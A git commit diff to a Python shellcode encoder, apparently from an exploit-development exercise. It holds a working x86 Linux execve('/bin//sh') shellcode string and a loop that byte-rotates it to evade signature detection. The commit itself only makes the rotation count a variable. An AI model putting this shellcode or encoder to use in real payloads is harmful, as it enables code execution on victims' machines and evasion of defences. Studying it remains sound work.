cdbadb032574437b0c9f263eca32eaa272245763
sachin <sachin3072004@gmail.com>
2018-12-19 23:13:17 -0800

    added numRotation

--- insertionEncoderDecoder/encoder.py
+++ insertionEncoderDecoder/encoder.py
@@ -26,10 +26,12 @@ def rotateLeft(num,rotate):
     return num | num1
 
 
-shellcode=("\x31\xd2\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode=("\x31\xd2\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68" \
+            "\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
 encoded=""
+numRotation = 3
 for x in bytearray(shellcode):
-    temp = rotateRight(x,3)
+    temp = rotateRight(x,numRotation)
     encoded += '0x'
     encoded += '%02x' % temp
     encoded += ","
